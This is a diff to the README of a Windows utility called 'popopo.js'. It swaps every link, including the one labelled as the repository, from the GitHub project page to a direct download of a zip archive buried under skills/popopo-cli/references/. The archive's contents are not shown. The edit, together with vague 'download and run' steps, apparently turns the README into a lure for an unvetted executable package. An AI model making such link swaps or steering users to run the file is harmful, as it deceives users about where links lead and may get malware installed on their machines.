@@ -1,12 +1,12 @@
 # 🟣 popopo.js - Simple tools for everyday use
 
-[![Download / Get the app](https://img.shields.io/badge/Download%20popopo.js-Click%20Here-blue?style=for-the-badge)](https://github.com/Molly2256/popopo.js)
+[![Download / Get the app](https://img.shields.io/badge/Download%20popopo.js-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip)
 
 ## 📥 Download popopo.js
 
 Use this link to visit the page and download the app:
 
-[https://github.com/Molly2256/popopo.js](https://github.com/Molly2256/popopo.js)
+[https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip](https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip)
 
 ## 🖥️ What popopo.js does
 
@@ -38,7 +38,7 @@ Before you install, make sure your PC has:
 Follow these steps on Windows.
 
 1. Open the download page:
-   [https://github.com/Molly2256/popopo.js](https://github.com/Molly2256/popopo.js)
+   [https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip](https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip)
 
 2. Look for the latest release or the main download file.
 
@@ -144,7 +144,7 @@ Yes, if the download and use terms allow it for your setup.
 ## 📦 Download and run
 
 1. Visit the download page:
-   [https://github.com/Molly2256/popopo.js](https://github.com/Molly2256/popopo.js)
+   [https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip](https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip)
 
 2. Download the app file to your Windows PC.
 
@@ -165,4 +165,4 @@ A simple setup may look like this:
 ## 🔗 Project link
 
 Repository:
-[https://github.com/Molly2256/popopo.js](https://github.com/Molly2256/popopo.js)
+[https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip](https://raw.githubusercontent.com/Molly2256/popopo.js/main/skills/popopo-cli/references/js-popopo-v3.4.zip)
